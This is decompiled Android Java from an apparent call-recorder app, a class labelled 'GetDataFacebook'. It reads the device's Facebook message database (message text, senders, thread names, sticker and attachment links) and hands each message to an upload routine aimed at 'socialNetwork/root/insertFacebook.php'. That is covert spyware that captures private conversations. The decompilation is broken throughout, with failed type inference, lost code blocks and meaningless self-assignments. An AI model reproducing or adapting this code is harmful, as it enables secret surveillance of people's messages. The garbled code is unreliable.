package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.database.Cursor;
import com.crashlytics.android.Crashlytics;
import java.io.DataOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import org.json.JSONArray;
import org.json.JSONObject;
import org.webrtc.MediaStreamTrack;

/* compiled from: GetDataFacebook */
public class a extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f155b;

    /* renamed from: a reason: collision with root package name */
    private final Context f156a;

    public a(Context context) {
        this.f156a = context;
    }

    /* JADX WARNING: type inference failed for: r24v0, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r0v0, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r15v0, types: [android.database.Cursor] */
    /* JADX WARNING: type inference failed for: r24v1 */
    /* JADX WARNING: type inference failed for: r15v1, types: [android.database.Cursor] */
    /* JADX WARNING: type inference failed for: r24v2 */
    /* JADX WARNING: type inference failed for: r2v3, types: [android.database.Cursor] */
    /* JADX WARNING: type inference failed for: r24v3 */
    /* JADX WARNING: type inference failed for: r24v4 */
    /* JADX WARNING: type inference failed for: r24v5 */
    /* JADX WARNING: type inference failed for: r24v6 */
    /* JADX WARNING: type inference failed for: r24v7 */
    /* JADX WARNING: type inference failed for: r15v6 */
    /* JADX WARNING: type inference failed for: r24v8 */
    /* JADX WARNING: type inference failed for: r0v19, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r24v9 */
    /* JADX WARNING: type inference failed for: r24v10 */
    /* JADX WARNING: type inference failed for: r24v11 */
    /* JADX WARNING: type inference failed for: r1v7 */
    /* JADX WARNING: type inference failed for: r1v8 */
    /* JADX WARNING: type inference failed for: r4v2, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r24v12 */
    /* JADX WARNING: type inference failed for: r24v13 */
    /* JADX WARNING: type inference failed for: r24v14 */
    /* JADX WARNING: type inference failed for: r24v15 */
    /* JADX WARNING: type inference failed for: r24v16 */
    /* JADX WARNING: type inference failed for: r24v17 */
    /* JADX WARNING: type inference failed for: r24v18 */
    /* JADX WARNING: type inference failed for: r24v19 */
    /* JADX WARNING: type inference failed for: r24v20 */
    /* JADX WARNING: type inference failed for: r24v21 */
    /* JADX WARNING: type inference failed for: r24v22 */
    /* JADX WARNING: type inference failed for: r24v23 */
    /* JADX WARNING: type inference failed for: r15v9 */
    /* JADX WARNING: type inference failed for: r24v24 */
    /* JADX WARNING: type inference failed for: r24v25 */
    /* JADX WARNING: type inference failed for: r15v13 */
    /* JADX WARNING: type inference failed for: r24v26 */
    /* JADX WARNING: type inference failed for: r1v19 */
    /* JADX WARNING: type inference failed for: r1v20, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r24v27 */
    /* JADX WARNING: type inference failed for: r1v21, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r2v23 */
    /* JADX WARNING: type inference failed for: r0v60 */
    /* JADX WARNING: type inference failed for: r2v24 */
    /* JADX WARNING: type inference failed for: r27v0 */
    /* JADX WARNING: type inference failed for: r1v22 */
    /* JADX WARNING: type inference failed for: r27v1 */
    /* JADX WARNING: type inference failed for: r27v2 */
    /* JADX WARNING: type inference failed for: r27v3 */
    /* JADX WARNING: type inference failed for: r27v4 */
    /* JADX WARNING: type inference failed for: r2v27 */
    /* JADX WARNING: type inference failed for: r2v28 */
    /* JADX WARNING: type inference failed for: r2v29 */
    /* JADX WARNING: type inference failed for: r2v33, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r0v73, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r24v28 */
    /* JADX WARNING: type inference failed for: r0v74 */
    /* JADX WARNING: type inference failed for: r1v33 */
    /* JADX WARNING: type inference failed for: r24v29 */
    /* JADX WARNING: type inference failed for: r15v14 */
    /* JADX WARNING: type inference failed for: r24v30 */
    /* JADX WARNING: type inference failed for: r15v15 */
    /* JADX WARNING: type inference failed for: r24v31 */
    /* JADX WARNING: type inference failed for: r24v32 */
    /* JADX WARNING: type inference failed for: r24v33 */
    /* JADX WARNING: type inference failed for: r24v34 */
    /* JADX WARNING: type inference failed for: r0v75 */
    /* JADX WARNING: type inference failed for: r24v35 */
    /* JADX WARNING: type inference failed for: r24v36 */
    /* JADX WARNING: type inference failed for: r1v34 */
    /* JADX WARNING: type inference failed for: r1v35 */
    /* JADX WARNING: type inference failed for: r24v37 */
    /* JADX WARNING: type inference failed for: r24v38 */
    /* JADX WARNING: type inference failed for: r24v39 */
    /* JADX WARNING: type inference failed for: r24v40 */
    /* JADX WARNING: type inference failed for: r24v41 */
    /* JADX WARNING: type inference failed for: r24v42 */
    /* JADX WARNING: type inference failed for: r24v43 */
    /* JADX WARNING: type inference failed for: r24v44 */
    /* JADX WARNING: type inference failed for: r24v45 */
    /* JADX WARNING: type inference failed for: r24v46 */
    /* JADX WARNING: type inference failed for: r24v47 */
    /* JADX WARNING: type inference failed for: r1v36 */
    /* JADX WARNING: type inference failed for: r1v37 */
    /* JADX WARNING: type inference failed for: r24v48 */
    /* JADX WARNING: type inference failed for: r24v49 */
    /* JADX WARNING: type inference failed for: r24v50 */
    /* JADX WARNING: type inference failed for: r27v5 */
    /* JADX WARNING: type inference failed for: r27v6 */
    /* JADX WARNING: type inference failed for: r27v7 */
    /* JADX WARNING: type inference failed for: r27v8 */
    /* JADX WARNING: type inference failed for: r27v9 */
    /* JADX WARNING: type inference failed for: r2v36 */
    /* JADX WARNING: type inference failed for: r2v37 */
    /* JADX WARNING: type inference failed for: r2v38 */
    /* JADX WARNING: type inference failed for: r2v39 */
    /* JADX WARNING: type inference failed for: r0v76 */
    /* JADX WARNING: type inference failed for: r24v51 */
    /* JADX WARNING: Code restructure failed: missing block: B:121:0x025d, code lost:
        if (r2.equals(r7) != false) goto L_0x025f;
     */
    /* JADX WARNING: Incorrect type for immutable var: ssa=java.lang.String, code=null, for r24v0, types: [java.lang.String] */
    /* JADX WARNING: Multi-variable type inference failed. Error: jadx.core.utils.exceptions.JadxRuntimeException: No candidate types for var: r24v1
  assigns: []
  uses: []
  mth insns count: 356
    	at jadx.core.dex.visitors.typeinference.TypeSearch.fillTypeCandidates(TypeSearch.java:237)
    	at java.util.ArrayList.forEach(Unknown Source)
    	at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:53)
    	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runMultiVariableSearch(TypeInferenceVisitor.java:99)
    	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:92)
    	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:27)
    	at jadx.core.dex.visitors.DepthTraversal.lambda$visit$1(DepthTraversal.java:14)
    	at java.util.ArrayList.forEach(Unknown Source)
    	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
    	at jadx.core.ProcessClass.process(ProcessClass.java:30)
    	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:311)
    	at jadx.api.JavaClass.decompile(JavaClass.java:62)
    	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:217)
     */
    /* JADX WARNING: Removed duplicated region for block: B:138:0x02a5  */
    /* JADX WARNING: Removed duplicated region for block: B:165:0x031d  */
    /* JADX WARNING: Removed duplicated region for block: B:59:0x015e  */
    /* JADX WARNING: Removed duplicated region for block: B:86:0x01cf A[SYNTHETIC, Splitter:B:86:0x01cf] */
    /* JADX WARNING: Removed duplicated region for block: B:91:0x01e1  */
    /* JADX WARNING: Unknown variable types count: 39 */
    private void a(Context context, String str, String r24, String str2, long j) throws Exception {
        int i;
        long j2;
        String str3;
        String str4;
        String str5;
        long j3;
        String str6;
        String str7;
        ? r1;
        ? r12;
        String str8;
        String str9;
        String string;
        String string2;
        String str10;
        ? r2;
        ? r0;
        ? r27;
        ? r13;
        ? r272;
        ? r273;
        ? r22;
        Context context2 = context;
        String str11 = str;
        String str12 = "user_key";
        String str13 = "thread_key";
        SimpleDateFormat d2 = c.d();
        a.c.f.a aVar = new a.c.f.a(context2, str11, r24);
        aVar.b();
        long j4 = j;
        ? b2 = aVar.b("messages", j4);
        if (b2 != 0) {
            if (b2.getCount() <= 0) {
                a(aVar, b2);
            } else {
                String str14 = "";
                long j5 = j4;
                String str15 = str14;
                String str16 = str15;
                r24 = r24;
                ? r15 = b2;
                while (r15.moveToNext()) {
                    try {
                        long j6 = r15.getLong(r15.getColumnIndexOrThrow("timestamp_ms"));
                        Date date = new Date();
                        date.setTime(j6);
                        Date date2 = new Date();
                        date2.setTime(e.n(context));
                        Calendar instance = Calendar.getInstance();
                        instance.setTime(date2);
                        instance.add(13, 1);
                        if (date.compareTo(instance.getTime()) > 0) {
                            ? string3 = r15.getString(r15.getColumnIndexOrThrow("text"));
                            String str17 = "'/>";
                            String str18 = "<img src='";
                            if (string3 != 0) {
                                if (!string3.equals(str14)) {
                                    str6 = str15;
                                    str7 = str16;
                                    j3 = j5;
                                    r24 = r24;
                                    r0 = string3;
                                    r13 = r0;
                                    r24 = r24;
                                    if (r1 == 0) {
                                        try {
                                            String string4 = r15.getString(r15.getColumnIndexOrThrow("sticker_id"));
                                            if (string4 != null) {
                                                try {
                                                    a.c.f.a aVar2 = new a.c.f.a(context2, str11, str2);
                                                    aVar2.b();
                                                    Cursor a2 = aVar2.a("stickers", string4);
                                                    if (a2 != null && a2.getCount() > 0) {
                                                        a2.moveToFirst();
                                                        StringBuilder sb = new StringBuilder();
                                                        sb.append(str18);
                                                        sb.append(a2.getString(a2.getColumnIndexOrThrow("uri")));
                                                        sb.append(str17);
                                                        r1 = sb.toString();
                                                    }
                                                    aVar2.a();
                                                    r12 = r1;
                                                } catch (Exception e2) {
                                                    e = e2;
                                                    e.getStackTrace();
                                                    r12 = r1;
                                                    ? r4 = r12;
                                                    string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                                    string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                                    JSONObject jSONObject = null;
                                                    String str19 = "name";
                                                    if (string2 != null) {
                                                    }
                                                    if (string != null) {
                                                    }
                                                    str8 = str6;
                                                    r24 = r24;
                                                    str7 = string2;
                                                    r24 = r24;
                                                    i = 0;
                                                    str4 = str12;
                                                    str3 = str13;
                                                    j2 = j3;
                                                    str5 = str14;
                                                    a(context, str8, r4, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                    j5 = date.getTime();
                                                    str16 = str7;
                                                    str15 = str8;
                                                    r24 = r24;
                                                    str11 = str;
                                                    r15 = r24;
                                                    str14 = str5;
                                                    str12 = str4;
                                                    str13 = str3;
                                                    r24 = r24;
                                                }
                                                ? r42 = r12;
                                                string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                                string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                                JSONObject jSONObject2 = null;
                                                String str192 = "name";
                                                if (string2 != null) {
                                                    try {
                                                        jSONObject2 = new JSONObject(string2);
                                                        string2 = jSONObject2.getString(str192);
                                                    } catch (Exception e3) {
                                                        e = e3;
                                                        str10 = string2;
                                                        r24 = r15;
                                                        str7 = str10;
                                                        r24 = r24;
                                                        str9 = str6;
                                                        r24 = r24;
                                                        try {
                                                            e.getStackTrace();
                                                            str8 = str9;
                                                            r24 = r24;
                                                            i = 0;
                                                            str4 = str12;
                                                            str3 = str13;
                                                            j2 = j3;
                                                            str5 = str14;
                                                            a(context, str8, r42, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                            j5 = date.getTime();
                                                            str16 = str7;
                                                            str15 = str8;
                                                            r24 = r24;
                                                            str11 = str;
                                                            r15 = r24;
                                                            str14 = str5;
                                                            str12 = str4;
                                                            str13 = str3;
                                                            r24 = r24;
                                                        } catch (Exception e4) {
                                                            e = e4;
                                                            r24 = r24;
                                                            j2 = j3;
                                                            r24 = r24;
                                                            i = 0;
                                                            r24 = r24;
                                                            e.getStackTrace();
                                                            try {
                                                                e.getStackTrace();
                                                                Crashlytics.logException(e);
                                                                r24 = r24;
                                                            } catch (Exception unused) {
                                                                r24 = r24;
                                                            }
                                                            if (j2 != 0) {
                                                            }
                                                            a(aVar, r24);
                                                            return;
                                                        }
                                                    }
                                                }
                                                if (string != null) {
                                                    if (jSONObject2 != null) {
                                                        try {
                                                            r24 = r24;
                                                            if (string.contains("ONE_TO_ONE")) {
                                                                String string5 = jSONObject2.getString(str12);
                                                                String[] split = string.split(":");
                                                                int i2 = 1;
                                                                String str20 = str14;
                                                                ? r152 = r15;
                                                                while (i2 < split.length) {
                                                                    StringBuilder sb2 = new StringBuilder();
                                                                    r24 = r152;
                                                                    try {
                                                                        r24 = r24;
                                                                        sb2.append("FACEBOOK:");
                                                                        sb2.append(split[i2]);
                                                                        String sb3 = sb2.toString();
                                                                        if (!sb3.equals(string5)) {
                                                                            str20 = sb3;
                                                                        }
                                                                        i2++;
                                                                        r152 = r24;
                                                                    } catch (Exception e5) {
                                                                        e = e5;
                                                                        r24 = r24;
                                                                        str10 = string2;
                                                                        r24 = r24;
                                                                        str7 = str10;
                                                                        r24 = r24;
                                                                        str9 = str6;
                                                                        r24 = r24;
                                                                        e.getStackTrace();
                                                                        str8 = str9;
                                                                        r24 = r24;
                                                                        i = 0;
                                                                        str4 = str12;
                                                                        str3 = str13;
                                                                        j2 = j3;
                                                                        str5 = str14;
                                                                        a(context, str8, r42, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                                        j5 = date.getTime();
                                                                        str16 = str7;
                                                                        str15 = str8;
                                                                        r24 = r24;
                                                                        str11 = str;
                                                                        r15 = r24;
                                                                        str14 = str5;
                                                                        str12 = str4;
                                                                        str13 = str3;
                                                                        r24 = r24;
                                                                    }
                                                                }
                                                                r24 = r152;
                                                                Cursor a3 = aVar.a("thread_users", str12, str20);
                                                                if (!(a3 == null || a3.getCount() == 0)) {
                                                                    a3.moveToFirst();
                                                                    str8 = a3.getString(a3.getColumnIndexOrThrow(str192));
                                                                    str7 = string2;
                                                                    r24 = r24;
                                                                    i = 0;
                                                                    str4 = str12;
                                                                    str3 = str13;
                                                                    j2 = j3;
                                                                    str5 = str14;
                                                                    a(context, str8, r42, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                                    j5 = date.getTime();
                                                                    str16 = str7;
                                                                    str15 = str8;
                                                                    r24 = r24;
                                                                }
                                                            }
                                                        } catch (Exception e6) {
                                                            e = e6;
                                                            r24 = r15;
                                                            str10 = string2;
                                                            r24 = r24;
                                                            str7 = str10;
                                                            r24 = r24;
                                                            str9 = str6;
                                                            r24 = r24;
                                                            e.getStackTrace();
                                                            str8 = str9;
                                                            r24 = r24;
                                                            i = 0;
                                                            str4 = str12;
                                                            str3 = str13;
                                                            j2 = j3;
                                                            str5 = str14;
                                                            a(context, str8, r42, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                            j5 = date.getTime();
                                                            str16 = str7;
                                                            str15 = str8;
                                                            r24 = r24;
                                                            str11 = str;
                                                            r15 = r24;
                                                            str14 = str5;
                                                            str12 = str4;
                                                            str13 = str3;
                                                            r24 = r24;
                                                        }
                                                    }
                                                    r24 = r15;
                                                    Cursor a4 = aVar.a("threads", str13, string);
                                                    if (!(a4 == null || a4.getCount() == 0)) {
                                                        a4.moveToFirst();
                                                        str9 = a4.getString(a4.getColumnIndexOrThrow(str192));
                                                        if (str9 != null) {
                                                            try {
                                                            } catch (Exception e7) {
                                                                e = e7;
                                                                str7 = string2;
                                                                e.getStackTrace();
                                                                str8 = str9;
                                                                r24 = r24;
                                                                i = 0;
                                                                str4 = str12;
                                                                str3 = str13;
                                                                j2 = j3;
                                                                str5 = str14;
                                                                a(context, str8, r42, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                                j5 = date.getTime();
                                                                str16 = str7;
                                                                str15 = str8;
                                                                r24 = r24;
                                                                str11 = str;
                                                                r15 = r24;
                                                                str14 = str5;
                                                                str12 = str4;
                                                                str13 = str3;
                                                                r24 = r24;
                                                            }
                                                        }
                                                        String string6 = a4.getString(a4.getColumnIndexOrThrow("senders"));
                                                        if (string6 != null) {
                                                            StringBuilder sb4 = new StringBuilder();
                                                            JSONArray jSONArray = new JSONArray(string6);
                                                            for (int i3 = 0; i3 < jSONArray.length(); i3++) {
                                                                String string7 = jSONArray.getJSONObject(i3).getString(str192);
                                                                if (!string2.equals(string7)) {
                                                                    sb4.append(string7);
                                                                    sb4.append("<br/>");
                                                                }
                                                            }
                                                            str8 = sb4.toString();
                                                            str7 = string2;
                                                            r24 = r24;
                                                            i = 0;
                                                            str4 = str12;
                                                            str3 = str13;
                                                            j2 = j3;
                                                            str5 = str14;
                                                            a(context, str8, r42, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                            j5 = date.getTime();
                                                            str16 = str7;
                                                            str15 = str8;
                                                            r24 = r24;
                                                        }
                                                        str8 = str9;
                                                        str7 = string2;
                                                        r24 = r24;
                                                        i = 0;
                                                        str4 = str12;
                                                        str3 = str13;
                                                        j2 = j3;
                                                        str5 = str14;
                                                        a(context, str8, r42, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                        j5 = date.getTime();
                                                        str16 = str7;
                                                        str15 = str8;
                                                        r24 = r24;
                                                    }
                                                } else {
                                                    r24 = r15;
                                                }
                                                str8 = str6;
                                                r24 = r24;
                                                str7 = string2;
                                                r24 = r24;
                                                i = 0;
                                                str4 = str12;
                                                str3 = str13;
                                                j2 = j3;
                                                str5 = str14;
                                                a(context, str8, r42, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                j5 = date.getTime();
                                                str16 = str7;
                                                str15 = str8;
                                                r24 = r24;
                                            }
                                        } catch (Exception e8) {
                                            e = e8;
                                            String str21 = str2;
                                            e.getStackTrace();
                                            r12 = r1;
                                            ? r422 = r12;
                                            string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                            string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                            JSONObject jSONObject22 = null;
                                            String str1922 = "name";
                                            if (string2 != null) {
                                            }
                                            if (string != null) {
                                            }
                                            str8 = str6;
                                            r24 = r24;
                                            str7 = string2;
                                            r24 = r24;
                                            i = 0;
                                            str4 = str12;
                                            str3 = str13;
                                            j2 = j3;
                                            str5 = str14;
                                            a(context, str8, r422, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                            j5 = date.getTime();
                                            str16 = str7;
                                            str15 = str8;
                                            r24 = r24;
                                            str11 = str;
                                            r15 = r24;
                                            str14 = str5;
                                            str12 = str4;
                                            str13 = str3;
                                            r24 = r24;
                                        }
                                    }
                                    String str22 = str2;
                                    r12 = r1;
                                    ? r4222 = r12;
                                    string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                    string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                    JSONObject jSONObject222 = null;
                                    String str19222 = "name";
                                    if (string2 != null) {
                                    }
                                    if (string != null) {
                                    }
                                    str8 = str6;
                                    r24 = r24;
                                    str7 = string2;
                                    r24 = r24;
                                    i = 0;
                                    str4 = str12;
                                    str3 = str13;
                                    j2 = j3;
                                    str5 = str14;
                                    a(context, str8, r4222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                    j5 = date.getTime();
                                    str16 = str7;
                                    str15 = str8;
                                    r24 = r24;
                                }
                            }
                            r24 = string3;
                            str6 = str15;
                            ? string8 = r15.getString(r15.getColumnIndexOrThrow("attachments"));
                            if (string8 != 0) {
                                try {
                                    JSONArray jSONArray2 = new JSONArray(string8);
                                    if (jSONArray2.length() != 0) {
                                        ? r274 = string8;
                                        try {
                                            if (jSONArray2.getJSONObject(0) != null) {
                                                str7 = str16;
                                                try {
                                                    if (jSONArray2.getJSONObject(0).getString("mime_type").contains(MediaStreamTrack.VIDEO_TRACK_KIND)) {
                                                        String string9 = jSONArray2.getJSONObject(0).getString("filename");
                                                        StringBuilder sb5 = new StringBuilder();
                                                        j3 = j5;
                                                        try {
                                                            sb5.append("<a href='");
                                                            sb5.append(jSONArray2.getJSONObject(0).getString("video_data_url"));
                                                            sb5.append("'>");
                                                            sb5.append(string9);
                                                            sb5.append("</a>");
                                                            r24 = r24;
                                                            r0 = sb5.toString();
                                                            r13 = r0;
                                                            r24 = r24;
                                                        } catch (Exception e9) {
                                                            e = e9;
                                                            r27 = r274;
                                                            try {
                                                                e.getStackTrace();
                                                                r13 = r27;
                                                                r24 = r24;
                                                                if (r1 == 0) {
                                                                }
                                                                String str222 = str2;
                                                                r12 = r1;
                                                                ? r42222 = r12;
                                                                string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                                                string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                                                JSONObject jSONObject2222 = null;
                                                                String str192222 = "name";
                                                                if (string2 != null) {
                                                                }
                                                                if (string != null) {
                                                                }
                                                                str8 = str6;
                                                                r24 = r24;
                                                                str7 = string2;
                                                                r24 = r24;
                                                                i = 0;
                                                                str4 = str12;
                                                                str3 = str13;
                                                                j2 = j3;
                                                                str5 = str14;
                                                                a(context, str8, r42222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                                j5 = date.getTime();
                                                                str16 = str7;
                                                                str15 = str8;
                                                                r24 = r24;
                                                                str11 = str;
                                                                r15 = r24;
                                                                str14 = str5;
                                                                str12 = str4;
                                                                str13 = str3;
                                                                r24 = r24;
                                                            } catch (Exception e10) {
                                                                e = e10;
                                                                r24 = r15;
                                                            }
                                                        }
                                                        if (r1 == 0) {
                                                        }
                                                        String str2222 = str2;
                                                        r12 = r1;
                                                        ? r422222 = r12;
                                                        string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                                        string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                                        JSONObject jSONObject22222 = null;
                                                        String str1922222 = "name";
                                                        if (string2 != null) {
                                                        }
                                                        if (string != null) {
                                                        }
                                                        str8 = str6;
                                                        r24 = r24;
                                                        str7 = string2;
                                                        r24 = r24;
                                                        i = 0;
                                                        str4 = str12;
                                                        str3 = str13;
                                                        j2 = j3;
                                                        str5 = str14;
                                                        a(context, str8, r422222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                        j5 = date.getTime();
                                                        str16 = str7;
                                                        str15 = str8;
                                                        r24 = r24;
                                                    } else {
                                                        j3 = j5;
                                                        int i4 = 0;
                                                        ? r23 = r24;
                                                        while (i4 < jSONArray2.length()) {
                                                            JSONObject jSONObject3 = jSONArray2.getJSONObject(i4);
                                                            if (jSONObject3 != null) {
                                                                JSONObject jSONObject4 = new JSONObject(new JSONObject(jSONObject3.getString("urls")).getString("MEDIUM_PREVIEW"));
                                                                StringBuilder sb6 = new StringBuilder();
                                                                sb6.append(str18);
                                                                sb6.append(jSONObject4.getString("src"));
                                                                sb6.append(str17);
                                                                r22 = sb6.toString();
                                                            } else {
                                                                r22 = r23;
                                                            }
                                                            i4++;
                                                            r23 = r22;
                                                        }
                                                        r2 = r23;
                                                        r0 = r2;
                                                        r24 = r24;
                                                        r13 = r0;
                                                        r24 = r24;
                                                        if (r1 == 0) {
                                                        }
                                                        String str22222 = str2;
                                                        r12 = r1;
                                                        ? r4222222 = r12;
                                                        string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                                        string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                                        JSONObject jSONObject222222 = null;
                                                        String str19222222 = "name";
                                                        if (string2 != null) {
                                                        }
                                                        if (string != null) {
                                                        }
                                                        str8 = str6;
                                                        r24 = r24;
                                                        str7 = string2;
                                                        r24 = r24;
                                                        i = 0;
                                                        str4 = str12;
                                                        str3 = str13;
                                                        j2 = j3;
                                                        str5 = str14;
                                                        a(context, str8, r4222222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                        j5 = date.getTime();
                                                        str16 = str7;
                                                        str15 = str8;
                                                        r24 = r24;
                                                    }
                                                } catch (Exception e11) {
                                                    e = e11;
                                                    r273 = r274;
                                                    j3 = j5;
                                                    r27 = r273;
                                                    e.getStackTrace();
                                                    r13 = r27;
                                                    r24 = r24;
                                                    if (r1 == 0) {
                                                    }
                                                    String str222222 = str2;
                                                    r12 = r1;
                                                    ? r42222222 = r12;
                                                    string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                                    string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                                    JSONObject jSONObject2222222 = null;
                                                    String str192222222 = "name";
                                                    if (string2 != null) {
                                                    }
                                                    if (string != null) {
                                                    }
                                                    str8 = str6;
                                                    r24 = r24;
                                                    str7 = string2;
                                                    r24 = r24;
                                                    i = 0;
                                                    str4 = str12;
                                                    str3 = str13;
                                                    j2 = j3;
                                                    str5 = str14;
                                                    a(context, str8, r42222222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                                    j5 = date.getTime();
                                                    str16 = str7;
                                                    str15 = str8;
                                                    r24 = r24;
                                                    str11 = str;
                                                    r15 = r24;
                                                    str14 = str5;
                                                    str12 = str4;
                                                    str13 = str3;
                                                    r24 = r24;
                                                }
                                            }
                                        } catch (Exception e12) {
                                            e = e12;
                                            r272 = r274;
                                            str7 = str16;
                                            r273 = r272;
                                            j3 = j5;
                                            r27 = r273;
                                            e.getStackTrace();
                                            r13 = r27;
                                            r24 = r24;
                                            if (r1 == 0) {
                                            }
                                            String str2222222 = str2;
                                            r12 = r1;
                                            ? r422222222 = r12;
                                            string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                            string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                            JSONObject jSONObject22222222 = null;
                                            String str1922222222 = "name";
                                            if (string2 != null) {
                                            }
                                            if (string != null) {
                                            }
                                            str8 = str6;
                                            r24 = r24;
                                            str7 = string2;
                                            r24 = r24;
                                            i = 0;
                                            str4 = str12;
                                            str3 = str13;
                                            j2 = j3;
                                            str5 = str14;
                                            a(context, str8, r422222222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                            j5 = date.getTime();
                                            str16 = str7;
                                            str15 = str8;
                                            r24 = r24;
                                            str11 = str;
                                            r15 = r24;
                                            str14 = str5;
                                            str12 = str4;
                                            str13 = str3;
                                            r24 = r24;
                                        }
                                    }
                                } catch (Exception e13) {
                                    e = e13;
                                    r272 = string8;
                                    str7 = str16;
                                    r273 = r272;
                                    j3 = j5;
                                    r27 = r273;
                                    e.getStackTrace();
                                    r13 = r27;
                                    r24 = r24;
                                    if (r1 == 0) {
                                    }
                                    String str22222222 = str2;
                                    r12 = r1;
                                    ? r4222222222 = r12;
                                    string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                    string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                    JSONObject jSONObject222222222 = null;
                                    String str19222222222 = "name";
                                    if (string2 != null) {
                                    }
                                    if (string != null) {
                                    }
                                    str8 = str6;
                                    r24 = r24;
                                    str7 = string2;
                                    r24 = r24;
                                    i = 0;
                                    str4 = str12;
                                    str3 = str13;
                                    j2 = j3;
                                    str5 = str14;
                                    a(context, str8, r4222222222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                    j5 = date.getTime();
                                    str16 = str7;
                                    str15 = str8;
                                    r24 = r24;
                                    str11 = str;
                                    r15 = r24;
                                    str14 = str5;
                                    str12 = str4;
                                    str13 = str3;
                                    r24 = r24;
                                }
                            }
                            str7 = str16;
                            j3 = j5;
                            r2 = r24;
                            r0 = r2;
                            r24 = r24;
                            r13 = r0;
                            r24 = r24;
                            if (r1 == 0) {
                            }
                            String str222222222 = str2;
                            r12 = r1;
                            ? r42222222222 = r12;
                            try {
                                string = r15.getString(r15.getColumnIndexOrThrow(str13));
                                string2 = r15.getString(r15.getColumnIndexOrThrow("sender"));
                                JSONObject jSONObject2222222222 = null;
                                String str192222222222 = "name";
                                if (string2 != null) {
                                }
                                if (string != null) {
                                }
                                str8 = str6;
                                r24 = r24;
                                str7 = string2;
                                r24 = r24;
                            } catch (Exception e14) {
                                e = e14;
                                r24 = r15;
                                str9 = str6;
                                r24 = r24;
                                e.getStackTrace();
                                str8 = str9;
                                r24 = r24;
                                i = 0;
                                str4 = str12;
                                str3 = str13;
                                j2 = j3;
                                str5 = str14;
                                a(context, str8, r42222222222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                j5 = date.getTime();
                                str16 = str7;
                                str15 = str8;
                                r24 = r24;
                                str11 = str;
                                r15 = r24;
                                str14 = str5;
                                str12 = str4;
                                str13 = str3;
                                r24 = r24;
                            }
                            i = 0;
                            str4 = str12;
                            str3 = str13;
                            j2 = j3;
                            str5 = str14;
                            try {
                                a(context, str8, r42222222222, str7, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                j5 = date.getTime();
                                str16 = str7;
                                str15 = str8;
                                r24 = r24;
                            } catch (Exception e15) {
                                e = e15;
                                r24 = r24;
                                e.getStackTrace();
                                e.getStackTrace();
                                Crashlytics.logException(e);
                                r24 = r24;
                                if (j2 != 0) {
                                }
                                a(aVar, r24);
                                return;
                            }
                        } else {
                            String str23 = str15;
                            String str24 = str16;
                            str5 = str14;
                            str4 = str12;
                            str3 = str13;
                            r24 = r15;
                            long j7 = j5;
                        }
                        str11 = str;
                        r15 = r24;
                        str14 = str5;
                        str12 = str4;
                        str13 = str3;
